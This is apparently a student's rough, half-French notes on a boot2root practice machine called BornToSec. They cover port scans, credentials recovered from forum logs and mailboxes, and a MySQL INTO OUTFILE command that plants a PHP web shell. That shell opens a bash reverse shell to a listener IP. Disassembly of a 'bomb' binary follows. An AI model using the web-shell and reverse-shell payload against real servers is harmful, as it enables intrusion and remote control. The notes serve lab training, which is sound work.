# Writeup1

*Hostname*: `BornToSec`    

## Overview

## Forum infos

Powered by: `My little forum` version  
### admin
- admin
### users
- lmezard       => on forum:!q\]Ej?*5K5cy*AJ
    -   email: laurie@borntosec.net
- qudevide
- thor
- wandre
- zaz

### Posts
There is a post with a log file within:
- there are many connection attempts and we can find a possible password: `!q\]Ej?*5K5cy*AJ`

## Services
### PHP
PHP/5.3.10-1ubuntu3.20
PHPSESSID set in a field => PHP Server behind.

Server behind: Apache/2.2.22 (Ubuntu)

## Ports

Post-scan script results:
| reverse-index: 
|   21/tcp: 10.64.1.105
|   22/tcp: 10.64.1.105
|   80/tcp: 10.64.1.105
|   143/tcp: 10.64.1.105
|   443/tcp: 10.64.1.105
|_  993/tcp: 10.64.1.105

### 21 FTP

*Version*: vsftpd 2.0.8 or later

| ftp-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 139 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
|_banner: 220 Welcome on this server


### 22 SSH

*Version*: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7

### 80 HTTP

Version: Apache httpd 2.2.22 ((Ubuntu))

### 443 HTTPS

http-enum: 
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|_  /webmail/images/sm_logo.png: SquirrelMail

#### PHPnyadmin

*version*: phpMyAdmin 3.4.10.1

#### SquirrelMail

*version*: 1.4.2

Vuln: Permet d'installer une backdoor une fois les indentifiants obtenues. 

RCE: once logged
https://10.64.1.105:443/webmail/src/login.php


## OS

Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16

#

TODO
RUN sqlmap avec l'option --form


## Walkthrough


### SquirrelMail

Now we can try to connect to the mailbox with the lmezard's email.

User: lmezard
Email: laurie@borntosec.net
Password: `!q\]Ej?*5K5cy*AJ`

That works!!

Let's explore around...

In a mail we found something interesting:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

We will see later if the can be useful:
DB Access: `root/Fg-'kKXBj87E:aJ$`

We also have the qudevide's email:

User: qudevide
Email: qudevide@mail.borntosec.net
Password: ?

That is very possible for the other email address's to have this form.    

Voyons voir dans les autres boites de receptions.

Nothing founded in Draft nor Trash folders but in the sent messages we have two mails.

They give us a new address: `ft_root@mail.borntosec.net`

If there is a user named `ft_root` it must be an high administrator and we hav his email addres!!

Now let's try something a little more funny with the squirelMail's RCE vulnerability.

<!-- TODO Try to add the RCE script to metasploit then run it and start to explore inside the machine -->

<!-- Reset the admin password on the forum? -->


# PART2

Detetct target: nmap 192.168.43.161/24 --script http-title -F    


## Write a shell file:

https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/

select "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.56/4321 0>&1'");"
 INTO OUTFILE "/var/www/forum/templates_c/shell7.php"

Download fun file with 
Boot2root: nc IP_ADDRESS PORT < ./fun
Local:     nc -l IP_ADDRESS PORT > ./fun.out

Untar the file: `tar -xf fun.out`.    

Resolve the problem:
 getme 1 => I
 getme 2 => h
 getme 3 => e
 getme 4 => a
 getme 5 => r
 getme 6 => t
 getme 7 => p
 getme 8 => w
 getme 9 => n
 getme 10 => a
 getme 11 => g
 getme 12 => e

 Get password: `Iheartpwnage`.    
 sha256'ed => echo -n 'Iheartpwnage' | shasum -a 256    
 => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4    

 Connect to Laurie with thoose credentials: Success!    

Message in the README:

```
    Diffuse this bomb!
    When you have all the password use it as "thor" user with ssh.

    HINT:
    P
    2
    b

    o
    4

    NO SPACE IN THE PASSWORD (password is case sensitive).
```

Interesting strings:
- isrveawhobpnutfg
- /usr/sbin/sendmail -bm
- Subject: Bomb notification 
- So you think you can stop the bomb with ctrl-c, do you?
- Welcome this is my little bomb !!!! You have 6 stages with only one life good luck !! Have a nice day!
- Curses, you've found the secret phase!
- But finding it and solving it are quite different...
- austinpowers

# Phase 1
Getting the dump looking at the `phase1` function.
Getting the rodata for te address of strings.    

Searching for address: `0x80497c0`.    
In the rodata section at the address 0x80497c0 we found: `Public speaking is very easy.`.    

# Phase2

Phase 2 is more complex: It call a function `read_six_numbers`.    

### read_six_numbers

First create the stackframe:
    8048fd8:	55                   	push   ebp
    8048fd9:	89 e5                	mov    ebp,esp
    8048fdb:	83 ec 08             	sub    esp,0x8
Puis on récupere les arguments de la fonction ? :
    8048fde:	8b 4d 08             	mov    ecx,DWORD PTR [ebp+0x8]
    8048fe1:	8b 55 0c             	mov    edx,DWORD PTR [ebp+0xc]

Quoi qu'il en soit après `sscanf` est appelé et la completion de 5 fields est testé.    

    8048fe4:	8d 42 14             	lea    eax,[edx+0x14]
    8048fe7:	50                   	push   eax
    8048fe8:	8d 42 10             	lea    eax,[edx+0x10]
    8048feb:	50                   	push   eax
    8048fec:	8d 42 0c             	lea    eax,[edx+0xc]
    8048fef:	50                   	push   eax
    8048ff0:	8d 42 08             	lea    eax,[edx+0x8]
    8048ff3:	50                   	push   eax
    8048ff4:	8d 42 04             	lea    eax,[edx+0x4]
    8048ff7:	50                   	push   eax
    8048ff8:	52                   	push   edx
    8048ff9:	68 1b 9b 04 08       	push   0x8049b1b
    8048ffe:	51                   	push   ecx
    8048fff:	e8 5c f8 ff ff       	call   8048860 <sscanf@plt>
    8049004:	83 c4 20             	add    esp,0x20
    8049007:	83 f8 05             	cmp    eax,0x5
    804900a:	7f 05                	jg     8049011 <read_six_numbers+0x39>
    804900c:	e8 eb 04 00 00       	call   80494fc <explode_bomb>

In the .rodata section at the address `0x8049b1b`: we can find the format string: `%d %d %d %d %d %d`

Les nombres lu vont êtres stockés 

### Phase 2 wich numbers?

[ebp-0x18] doit être égale de 1.

This operation: 
    8048b79:	0f af 44 9e fc       	imul   eax,DWORD PTR [esi+ebx*4-0x4]
multiply eax by es

### strings not equal

Like a strcmp
Return 1 if strings are differents and 0 if they are equal or null length

# Secret stage

In the .rodata section we can find the string: `Curses, you've found the secret phase!` at the address: `0x08049d20`.    

Looking in the code we see this address printed here:
    8049573:	68 20 9d 04 08       	push   0x8049d20
    8049578:	e8 93 f2 ff ff       	call   8048810 <printf@plt>
In the function `phase_defused`.   


num_input_strings
0x08049da0

austinpowers